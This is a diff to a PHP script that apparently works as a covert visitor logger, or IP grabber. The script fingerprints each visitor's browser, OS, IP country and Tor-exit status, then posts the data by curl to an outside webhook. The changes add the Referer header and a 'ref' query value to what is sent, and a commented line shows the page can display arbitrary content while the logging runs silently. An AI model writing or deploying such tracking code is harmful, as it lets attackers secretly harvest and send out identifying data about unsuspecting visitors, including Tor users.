@@ -3,7 +3,6 @@ class OS_BR{
 
     private $agent = "";
     private $info = array();
-
     function __construct(){
         $this->agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : NULL;
         $this->getBrowser();
@@ -149,9 +148,15 @@ function country() {
   $country = $details->country;
   return "https://flagpedia.net/data/flags/w580/".strtolower($country).".png";
 }
-if (substr(get_client_ip(), 0, 4) == "172." or substr(get_client_ip(), 0, 3) == "10." or substr(get_client_ip(), 0, 8) == "192.168.") {
-  return;
-} else {
+function actualurl() {
+  $request_headers = apache_request_headers();
+  return "`" . $request_headers['Referer'] . "`";
+}
+function ref() {
+  $ref = $_GET['ref'];
+  return '`' . $ref . '`';
+}
+if (substr(get_client_ip(), 0, 4) == "172." or substr(get_client_ip(), 0, 3) == "10." or substr(get_client_ip(), 0, 8) == "192.168.") return; else {
   $obj = new OS_BR();
   $timestamp = date("c", strtotime("now"));
   $json_data = json_encode([
@@ -199,14 +204,15 @@ if (substr(get_client_ip(), 0, 4) == "172." or substr(get_client_ip(), 0, 3) == 
                   [
                       "name" => "Tor Exit :onion:",
                       "value" => torexit()
-                  ]
+                  ],
+                  ["name"=>"URL","value"=>actualurl()],
+                  ["name"=>"Ref","value"=>ref()]
               ]
           ]
           
       ]
   
   ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
-  
   $ch = curl_init( $webhookurl );
   curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
   curl_setopt( $ch, CURLOPT_POST, 1);
@@ -216,4 +222,5 @@ if (substr(get_client_ip(), 0, 4) == "172." or substr(get_client_ip(), 0, 3) == 
   curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
   $response = curl_exec( $ch );
   curl_close( $ch );
+  #echo 'WHATEVER YOU WANT';
 }
